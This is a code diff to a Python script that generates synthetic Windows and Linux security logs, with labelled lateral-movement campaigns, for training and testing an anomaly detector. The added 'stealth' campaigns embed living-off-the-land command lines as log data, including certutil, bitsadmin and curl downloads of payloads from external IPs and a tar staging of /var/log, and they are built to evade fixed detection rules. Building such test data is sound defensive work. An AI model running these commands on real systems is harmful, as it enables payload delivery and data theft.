@@ -8,10 +8,10 @@ Generates ONLY Windows and Linux raw logs in .log files using authentic formats:
   5. data/raw/linux_auth.log               (/var/log/auth.log: sshd, sudo, pam_unix)
   6. data/raw/linux_syslog_audit.log       (/var/log/syslog & auditd: systemd, CRON, auditd EXECVE)
 
-Also creates convenient browser-uploadable sample .log files in data/upload_samples/:
-  - windows_lateral_sample.log (~12,000 events)
-  - linux_lateral_sample.log   (~8,000 events)
-  - combined_enterprise_sample.log (~20,000 Windows + Linux events)
+Also creates convenient browser-uploadable sample .log files in data/uploads/:
+  - windows_only_logs.log
+  - linux_only_logs.log
+  - combined_windows_linux_logs.log
 
 Ground-truth attack windows are saved separately in data/raw/ground_truth_campaigns.csv.
 """
@@ -272,6 +272,8 @@ def generate_raw_dataset(
     days: int = 30,
     seed: int = 42,
     write_samples: bool = True,
+    start_dt: datetime | None = None,
+    num_campaigns: int | None = None,
 ) -> Dict[str, Any]:
     """Stream 1M+ legitimate Windows + Linux raw logs as .log files."""
     os.makedirs(raw_dir, exist_ok=True)
@@ -307,7 +309,7 @@ def generate_raw_dataset(
     lin_sys_path = os.path.join(raw_dir, "linux_syslog_audit.log")
     gt_path = os.path.join(raw_dir, "ground_truth_campaigns.csv")
 
-    start_dt = datetime(2025, 11, 1, 7, 0, 0)
+    start_dt = start_dt or datetime(2025, 11, 1, 7, 0, 0)
 
     n_win_sec = int(total_events * 0.30)
     n_win_ps = int(total_events * 0.12)
@@ -460,9 +462,9 @@ def generate_raw_dataset(
                 f_lsys.write("\n".join(buf_lsys) + "\n")
                 buf_lsys.clear()
 
-        # Place campaigns across the latter portion of the timeline (last 30% of days)
-        # so a chronological 70/30 Train/Test split places baseline in Train and attacks in Test!
-        test_start_day = max(1, int(days * 0.72))
+        # Place campaigns strictly in the final ~25% of days so a chronological
+        # 70/30 Train/Test window split keeps 100% of attacks inside Test (0 in Train).
+        test_start_day = max(1, int(days * 0.75))
         campaigns = [
             ("camp_01_ali_offhours_smb_psexec", "ali", "host001", "192.168.50.77", ["hr01", "hr02", "dc01"], 0, 2, False),
             ("camp_02_sara_finance_db_pivot", "sara", "host002", "10.0.0.8", ["finance01", "finance02", "db01"], 1, 14, False),
@@ -476,12 +478,24 @@ def generate_raw_dataset(
             ("camp_10_ali_rdp_service_staging", "ali", "host001", "192.168.99.15", ["hr01", "db01", "dc01"], 8, 21, True),
         ]
 
+        if num_campaigns is not None:
+            campaigns = campaigns[:max(1, min(len(campaigns), int(num_campaigns)))]
+
         gt_rows: List[Dict[str, Any]] = []
         rec_seq = 900_000_000
         for camp_name, user, init_host, att_ip, targets, rel_d, hr, has_linux in campaigns:
             d_off = min(days - 1, test_start_day + rel_d % max(1, days - test_start_day))
             base_ts = start_dt.replace(hour=hr, minute=10, second=0) + timedelta(days=d_off)
             init_ip = HOST_IPS.get(init_host, "10.0.0.5")
+
+            # Interleave normal activity inside the same 10-minute window (so correlation isolates attacker from normal users)
+            for b_idx, b_user in enumerate(["emp020", "emp035", "emp050"]):
+                b_host = f"ws-{20 + b_idx * 15:03d}"
+                b_ip = f"10.0.10.{30 + b_idx * 15}"
+                b_ts = base_ts + timedelta(minutes=1 + b_idx * 2, seconds=25)
+                proc_p, cmd_l = BENIGN_WIN_PROCS[b_idx % len(BENIGN_WIN_PROCS)]
+                buf_sec.append(_win_sec_json(b_ts, 800_000_000 + rec_seq % 100_000 + b_idx, 4688, b_host, b_user, b_ip, proc_p, cmd_l))
+                buf_lsys.append(_linux_syslog_line(b_ts + timedelta(seconds=3), f"linux-dev0{b_idx + 1}", "systemd", 4100 + b_idx, f"Started Session {300 + b_idx} of user {b_user}."))
 
             for k in range(4):
                 ev_ts = base_ts + timedelta(seconds=k * 15)
@@ -560,6 +574,81 @@ def generate_raw_dataset(
                 "is_attack": 1,
             })
 
+        # Stealthy Living-off-the-Land (LotL) campaigns engineered to evade ALL 6 Fixed Rules
+        # (work hours, <=2 hosts, non-sensitive hosts, <3 failed logins, no SMB shares, non-blacklisted tools)
+        # while exhibiting strong behavioral anomalies (high command diversity, external IP, failed_then_success) caught by ML.
+        stealth_campaigns = [
+            ("stealth_01_emp033_lotl_recon_exfil", "emp033", "ws-033", "eng01", "198.51.100.77", 0, 10, True),
+            ("stealth_02_emp061_certutil_curl_pivot", "emp061", "ws-061", "linux-app05", "45.33.12.90", 2, 13, True),
+            ("stealth_03_eng_lead_living_off_land", "eng_lead", "eng01", "eng02", "203.0.113.199", 4, 15, False),
+        ]
+        stealth_limit = 2 if (num_campaigns is not None and num_campaigns <= 6) else len(stealth_campaigns)
+        lotl_win_cmds = [
+            ("C:\\Windows\\System32\\whoami.exe", "whoami /all"),
+            ("C:\\Windows\\System32\\nltest.exe", "nltest /domain_trusts"),
+            ("C:\\Windows\\System32\\ipconfig.exe", "ipconfig /all"),
+            ("C:\\Windows\\System32\\netstat.exe", "netstat -ano"),
+            ("C:\\Windows\\System32\\systeminfo.exe", "systeminfo"),
+            ("C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://45.33.12.90/stage.bin C:\\Users\\Public\\s.dat"),
+            ("C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /transfer job1 http://198.51.100.77/cfg C:\\Users\\Public\\cfg.xml"),
+            ("C:\\Windows\\System32\\robocopy.exe", "robocopy \\\\eng01\\Users\\Public\\Docs C:\\Users\\Public\\Stage /E"),
+            ("C:\\Windows\\System32\\reg.exe", "reg query HKLM\\SOFTWARE\\Policies /s"),
+            ("C:\\Windows\\System32\\wevtutil.exe", "wevtutil qe Security /c:20 /f:text"),
+        ]
+        lotl_linux_cmds = [
+            ("python3", "python3 -c \"import socket,os; print(os.uname())\""),
+            ("curl", "curl -sS http://45.33.12.90/payload.py -o /dev/shm/.worker.py"),
+            ("tar", "tar -czf /dev/shm/.bundle.tar.gz /var/log/ /etc/hosts"),
+            ("ss", "ss -tunap"),
+            ("id", "id && uname -a"),
+        ]
+
+        for s_name, s_user, h1, h2, ext_ip, rel_d, hr, s_linux in stealth_campaigns[:stealth_limit]:
+            d_off = min(days - 1, test_start_day + (rel_d + 1) % max(1, days - test_start_day))
+            base_ts = start_dt.replace(hour=hr, minute=20, second=0) + timedelta(days=d_off)
+            h1_ip = HOST_IPS.get(h1, "10.0.10.33")
+
+            # Only 2 failed logins (< threshold 3 so Rule 5 does not trigger) followed by 1 logon from external IP
+            for k in range(2):
+                buf_sec.append(_win_sec_json(base_ts + timedelta(seconds=k * 12), rec_seq, 4625, h1, s_user, ext_ip, logon_type=3))
+                rec_seq += 1
+            buf_sec.append(_win_sec_json(base_ts + timedelta(seconds=35), rec_seq, 4624, h1, s_user, ext_ip, "C:\\Windows\\explorer.exe", "-", logon_type=3))
+            rec_seq += 1
+            buf_rdp.append(_win_rdp_json(
+                base_ts + timedelta(seconds=42),
+                "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational",
+                "Microsoft-Windows-TerminalServices-RemoteConnectionManager",
+                1149, h1, s_user, ext_ip, 61,
+            ))
+
+            # Execute 10 distinct non-blacklisted LotL commands across h1 & h2 (<=2 non-sensitive hosts, work hours)
+            for idx_c, (p_path, c_line) in enumerate(lotl_win_cmds):
+                target_h = h1 if idx_c < 5 else (h1 if s_linux else h2)
+                buf_sec.append(_win_sec_json(
+                    base_ts + timedelta(minutes=1, seconds=10 + idx_c * 14),
+                    rec_seq, 4688, target_h, s_user, h1_ip if idx_c < 5 else ext_ip, p_path, c_line,
+                ))
+                rec_seq += 1
+
+            if s_linux and h2.startswith("linux-"):
+                buf_lauth.append(_linux_syslog_line(base_ts + timedelta(minutes=3, seconds=40), h2, "sshd", 9801, f"Accepted publickey for {s_user} from {h1_ip} port 59120 ssh2"))
+                for idx_l, (comm, cmdline) in enumerate(lotl_linux_cmds):
+                    buf_lsys.append(_linux_syslog_line(
+                        base_ts + timedelta(minutes=4, seconds=idx_l * 15),
+                        h2, "auditd", 9820 + idx_l,
+                        f'type=EXECVE user={s_user} src={h1_ip} comm="{comm}" cmdline="{cmdline}"',
+                    ))
+            else:
+                buf_sec.append(_win_sec_json(base_ts + timedelta(minutes=3, seconds=45), rec_seq, 4624, h2, s_user, h1_ip, logon_type=3))
+                rec_seq += 1
+
+            gt_rows.append({
+                "user": s_user,
+                "time_window": base_ts.replace(minute=(base_ts.minute // 10) * 10, second=0, microsecond=0).strftime("%Y-%m-%d %H:%M:%S"),
+                "attack_scenario": s_name,
+                "is_attack": 1,
+            })
+
         if buf_sec:
             f_sec.write("\n".join(buf_sec) + "\n")
         if buf_ps:
@@ -593,9 +682,9 @@ def generate_raw_dataset(
         out_p.close()
         os.remove(win_sec_path)
 
-    # Also generate convenient upload-ready .log files (~18k events, ~2-4 MB each) in data/upload_samples/
+    # Also generate convenient upload-ready .log files in data/uploads/
     if write_samples and total_events >= 20_000:
-        samples_dir = os.path.join(os.path.dirname(raw_dir), "upload_samples")
+        samples_dir = os.path.join(os.path.dirname(raw_dir), "uploads")
         _create_convenient_upload_samples(samples_dir, seed=seed + 1)
 
     counts = {
@@ -611,54 +700,110 @@ def generate_raw_dataset(
     return counts
 
 
+def _extract_ts_sort_key(line: str, default_year: int = 2025) -> datetime:
+    s = line.strip()
+    if s.startswith("{"):
+        try:
+            tc = str(json.loads(s).get("TimeCreated", "")).replace("Z", "")
+            return datetime.fromisoformat(tc)
+        except Exception:
+            return datetime(default_year, 1, 1)
+    # Linux RFC3164 line: "Jul 01 07:05:00 ..."
+    try:
+        parts = s.split(None, 3)
+        if len(parts) >= 3:
+            return datetime.strptime(f"{default_year} {parts[0]} {parts[1]} {parts[2]}", "%Y %b %d %H:%M:%S")
+    except Exception:
+        pass
+    return datetime(default_year, 1, 1)
+
+
 def _create_convenient_upload_samples(samples_dir: str, seed: int = 101) -> None:
-    """Create compact, browser-upload-friendly .log files combining Windows + Linux events."""
-    os.makedirs(samples_dir, exist_ok=True)
-    tmp_dir = os.path.join(samples_dir, "_tmp_build")
-    generate_raw_dataset(tmp_dir, total_events=18_000, days=15, seed=seed, write_samples=False)
-
-    # 1. Combined Windows + Linux single .log file (~18k events, ~4 MB)
-    combined_path = os.path.join(samples_dir, "combined_windows_linux_sample.log")
-    with open(combined_path, "w", encoding="utf-8") as out_f:
-        for fname in [
-            "windows_security.log",
-            "windows_powershell_cmd.log",
-            "windows_rdp.log",
-            "windows_system_app.log",
-            "linux_auth.log",
-            "linux_syslog_audit.log",
-        ]:
-            src_f = os.path.join(tmp_dir, fname)
-            with open(src_f, "r", encoding="utf-8") as in_f:
-                out_f.write(in_f.read())
-
-    # 2. Separate Windows-only & Linux-only uploadable .log samples
-    win_sample = os.path.join(samples_dir, "windows_all_channels_sample.log")
-    with open(win_sample, "w", encoding="utf-8") as out_f:
-        for fname in [
-            "windows_security.log",
-            "windows_powershell_cmd.log",
-            "windows_rdp.log",
-            "windows_system_app.log",
-        ]:
-            with open(os.path.join(tmp_dir, fname), "r", encoding="utf-8") as in_f:
-                out_f.write(in_f.read())
-
-    lin_sample = os.path.join(samples_dir, "linux_all_logs_sample.log")
-    with open(lin_sample, "w", encoding="utf-8") as out_f:
-        for fname in ["linux_auth.log", "linux_syslog_audit.log"]:
-            with open(os.path.join(tmp_dir, fname), "r", encoding="utf-8") as in_f:
-                out_f.write(in_f.read())
-
-    # Preserve matching ground truth for the sample set
-    gt_src = os.path.join(tmp_dir, "ground_truth_campaigns.csv")
-    gt_dst = os.path.join(samples_dir, "ground_truth_samples.csv")
-    if os.path.exists(gt_src):
-        pd.read_csv(gt_src).to_csv(gt_dst, index=False)
-
+    """Create unified, chronologically ordered uploadN.log + uploadN_test.log datasets."""
     import shutil
-    shutil.rmtree(tmp_dir, ignore_errors=True)
-    logger.info("Created convenient uploadable .log samples in %s", samples_dir)
+
+    os.makedirs(samples_dir, exist_ok=True)
+    # Remove any old files in uploads_dir so only upload1..5 pairs exist
+    for existing in os.listdir(samples_dir):
+        ep = os.path.join(samples_dir, existing)
+        if os.path.isfile(ep):
+            os.remove(ep)
+        elif os.path.isdir(ep):
+            shutil.rmtree(ep, ignore_errors=True)
+
+    specs = [
+        ("upload1", datetime(2025, 7, 1, 7, 0, 0), 12_000, 15, 6, seed),
+        ("upload2", datetime(2025, 8, 1, 7, 0, 0), 15_000, 15, 8, seed + 101),
+        ("upload3", datetime(2025, 9, 1, 7, 0, 0), 18_000, 15, 10, seed + 202),
+        ("upload4", datetime(2025, 10, 1, 7, 0, 0), 22_000, 15, 10, seed + 303),
+        ("upload5", datetime(2025, 11, 1, 7, 0, 0), 30_000, 15, 10, seed + 404),
+    ]
+
+    gt_frames: List[pd.DataFrame] = []
+    stream_files = [
+        "windows_security.log",
+        "windows_powershell_cmd.log",
+        "windows_rdp.log",
+        "windows_system_app.log",
+        "linux_auth.log",
+        "linux_syslog_audit.log",
+    ]
+
+    for name, sdt, n_ev, n_days, n_camp, u_seed in specs:
+        tmp_dir = os.path.join(samples_dir, f"_tmp_{name}")
+        generate_raw_dataset(
+            tmp_dir,
+            total_events=n_ev,
+            days=n_days,
+            seed=u_seed,
+            write_samples=False,
+            start_dt=sdt,
+            num_campaigns=n_camp,
+        )
+
+        # Combine all streams and sort chronologically so normal & lateral-movement events
+        # interleave realistically inside each 10-minute window.
+        timed_lines: List[tuple] = []
+        for fname in stream_files:
+            src_f = os.path.join(tmp_dir, fname)
+            if os.path.exists(src_f):
+                with open(src_f, "r", encoding="utf-8") as in_f:
+                    for raw_line in in_f:
+                        s = raw_line.strip()
+                        if s:
+                            timed_lines.append((_extract_ts_sort_key(s), s))
+        timed_lines.sort(key=lambda pair: pair[0])
+
+        full_path = os.path.join(samples_dir, f"{name}.log")
+        with open(full_path, "w", encoding="utf-8") as out_f:
+            out_f.write("\n".join(line for _, line in timed_lines) + "\n")
+
+        # Export exact 30% Test slice (70/30 10-min window boundary) as uploadN_test.log
+        windows = sorted({dt.replace(minute=(dt.minute // 10) * 10, second=0, microsecond=0) for dt, _ in timed_lines})
+        cut = max(1, min(len(windows) - 1, int(len(windows) * 0.70))) if len(windows) >= 2 else 0
+        cutoff = windows[cut] if windows else sdt
+        test_lines = [line for dt, line in timed_lines if dt >= cutoff]
+        test_path = os.path.join(samples_dir, f"{name}_test.log")
+        with open(test_path, "w", encoding="utf-8") as out_t:
+            out_t.write("\n".join(test_lines) + "\n")
+
+        gt_src = os.path.join(tmp_dir, "ground_truth_campaigns.csv")
+        if os.path.exists(gt_src):
+            gt_frames.append(pd.read_csv(gt_src))
+
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+        logger.info("Created %s.log (%d events) + %s_test.log (%d events, cutoff=%s)", name, len(timed_lines), name, len(test_lines), cutoff)
+
+    # Save unified non-overlapping ground truth in data/raw/ground_truth_campaigns.csv
+    raw_dir = os.path.join(os.path.dirname(samples_dir), "raw")
+    os.makedirs(raw_dir, exist_ok=True)
+    if gt_frames:
+        all_gt = pd.concat(gt_frames, ignore_index=True).drop_duplicates(subset=["user", "time_window"])
+        all_gt.to_csv(os.path.join(raw_dir, "ground_truth_campaigns.csv"), index=False)
+    old_sample_gt = os.path.join(raw_dir, "ground_truth_samples.csv")
+    if os.path.exists(old_sample_gt):
+        os.remove(old_sample_gt)
+    logger.info("Created unified upload1..upload5 pairs in %s", samples_dir)
 
 
 def main() -> None:
